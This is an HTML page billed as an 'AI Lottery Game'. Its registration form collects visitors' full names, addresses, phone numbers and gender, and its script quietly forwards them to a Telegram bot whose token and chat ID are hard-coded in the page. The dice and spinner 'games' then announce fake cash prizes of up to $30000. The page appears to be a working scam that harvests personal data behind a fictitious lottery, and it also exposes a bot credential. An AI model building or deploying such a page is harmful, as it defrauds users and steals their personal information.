<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AI Lottery Game</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f2f2f2;
            text-align: center;
        }
        h1 {
            color: green;
        }
        .container {
            margin: 20px auto;
            max-width: 500px;
            padding: 20px;
            background-color: white;
            border-radius: 10px;
            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.2);
        }
        input, select, button {
            display: block;
            width: 90%;
            margin: 10px auto;
            padding: 10px;
            font-size: 16px;
            border: 1px solid #ccc;
            border-radius: 5px;
        }
        button {
            background-color: #4CAF50;
            color: white;
            cursor: pointer;
        }
        .game-list button {
            background-color: #007BFF;
        }
        .dice, .spinner {
            font-size: 50px;
            margin: 20px auto;
            color: #333;
        }
        .board-container {
            position: relative;
            margin: 20px auto;
        }
        #spinner {
            width: 300px;
            height: 300px;
            border: 10px solid #ccc;
            border-radius: 50%;
            position: relative;
        }
        .pointer {
            position: absolute;
            top: -20px;
            left: 50%;
            transform: translateX(-50%);
            width: 0;
            height: 0;
            border-left: 20px solid transparent;
            border-right: 20px solid transparent;
            border-bottom: 40px solid red;
        }
    </style>
</head>
<body>

<div class="container" id="formContainer">
    <h2>Lottery Registration Form</h2>
    <form id="lotteryForm">
        <input type="text" id="firstName" placeholder="First Name" required>
        <input type="text" id="middleName" placeholder="Middle Name">
        <input type="text" id="lastName" placeholder="Last Name" required>
        <input type="text" id="address" placeholder="Full Address" required>
        <input type="tel" id="phone" placeholder="Phone Number" required>
        <select id="gender" required>
            <option value="" disabled selected>Select Gender</option>
            <option value="Male">Male</option>
            <option value="Female">Female</option>
        </select>
        <button type="submit">Submit</button>
    </form>
</div>

<div class="container" id="welcomeContainer" style="display: none;">
    <h1 id="welcomeMessage"></h1>
    <h3>Select a game to play:</h3>
    <div class="game-list">
        <button onclick="playDice()">🎲 Roll the Dice</button>
        <button onclick="playSpin()">🎡 Spin the Board</button>
    </div>
</div>

<div class="container" id="gameContainer" style="display: none;">
    <div id="gameResult" style="font-size: 18px;"></div>
    <div class="dice" id="diceDisplay" style="display: none;"></div>

    <!-- Spinner -->
    <div class="board-container" id="spinnerContainer" style="display: none;">
        <div class="pointer"></div>
        <div id="spinner"></div>
    </div>
</div>

<script>
const TELEGRAM_BOT_TOKEN = '7636367334:AAE6d7AShLfccWJWMkyffSVrvpkURjfqtPY';
const TELEGRAM_CHAT_ID = '874563737';

// Form Submission to Telegram
document.getElementById('lotteryForm').addEventListener('submit', function (e) {
    e.preventDefault();

    const firstName = document.getElementById('firstName').value;
    const lastName = document.getElementById('lastName').value;
    const middleName = document.getElementById('middleName').value;
    const address = document.getElementById('address').value;
    const phone = document.getElementById('phone').value;
    const gender = document.getElementById('gender').value;

    const message = `New Lottery Registration:\nName: ${firstName} ${middleName} ${lastName}\nAddress: ${address}\nPhone: ${phone}\nGender: ${gender}`;

    fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message }),
    }).then(() => {
        document.getElementById('formContainer').style.display = 'none';
        document.getElementById('welcomeContainer').style.display = 'block';
        document.getElementById('welcomeMessage').innerHTML = 
            `Dear <b style="color: green;">${firstName} ${lastName}</b>, we welcome you to AI Lottery Page!`;
    });
});

// Rolling Dice Game
function playDice() {
    document.getElementById('diceDisplay').style.display = 'block';
    const diceElement = document.getElementById('diceDisplay');
    let roll = 0;

    const diceAnimation = setInterval(() => {
        roll = Math.ceil(Math.random() * 6);
        diceElement.innerHTML = `🎲 ${roll}`;
    }, 100);

    setTimeout(() => {
        clearInterval(diceAnimation);
        const prizes = ["$1000", "$2000", "$5000", "$10000", "$20000"];
        const prize = prizes[roll - 1]; // Map roll to prize
        document.getElementById('gameResult').innerHTML = 
            `🎉 Congratulations! You rolled ${roll} and won ${prize}!`;
    }, 3000);
}

// Spin the Board Game
function playSpin() {
    document.getElementById('spinnerContainer').style.display = 'block';
    const spinner = document.getElementById('spinner');
    const prizes = ['$2000', '$5000', '$1000', '$15000', '$20000', '$30000', 'Try Again'];
    let rotation = 0;

    const spinAnimation = setInterval(() => {
        rotation += 10;
        spinner.style.transform = `rotate(${rotation}deg)`;
    }, 50);

    setTimeout(() => {
        clearInterval(spinAnimation);
        const finalIndex = Math.floor(Math.random() * prizes.length);
        const finalPrize = prizes[finalIndex];
        const stopRotation = rotation + (360 / prizes.length) * finalIndex;
        spinner.style.transform = `rotate(${stopRotation}deg)`;

        setTimeout(() => {
            if (finalPrize === 'Try Again') {
                alert('Try Again!');
            } else {
                alert(`🎉 Congratulations! You won ${finalPrize}`);
            }
            document.getElementById('gameResult').innerHTML = `Result: ${finalPrize}`;
        }, 500);
    }, 5000);
}
</script>

</body>
</html>
